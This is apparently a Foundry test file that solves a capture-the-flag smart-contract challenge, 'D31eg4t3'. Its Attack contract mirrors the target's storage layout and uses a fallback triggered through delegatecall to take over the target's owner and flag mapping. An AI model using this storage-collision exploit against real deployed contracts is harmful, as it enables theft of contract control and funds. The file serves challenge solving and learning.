// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/Delegate.sol";

contract DelegateTest is Test {
    mapping(address => bool) public canYouHackMe;
    address public owner;
    D31eg4t3 delegate;
    Attack attackContract;

    address ownerContract = makeAddr("OWNER");
    address hacker = makeAddr("HACKER");

    function setUp() external {
        vm.startPrank(ownerContract);
        delegate = new D31eg4t3();
        attackContract = new Attack(address(delegate));
        vm.stopPrank();
    }

    function test_CheckGetters() external {
        assertEq(delegate.owner(), ownerContract);
    }

    function test_Exploit() external {
        vm.prank(hacker);
        attackContract.attack();

        console.log("OWNER", delegate.owner());
    }
}

contract Attack {
    uint256 a;
    uint256 b;
    uint256 c;
    uint256 d;
    uint256 e;
    address public owner;
    mapping(address => bool) public canYouHackMe;
    D31eg4t3 delegate;

    constructor(address _addr) {
        delegate = D31eg4t3(_addr);
    }

    function attack() external {
        delegate.hackMe("");
    }

    fallback() external {
    owner = tx.origin;
    canYouHackMe[tx.origin] = true;
  }
}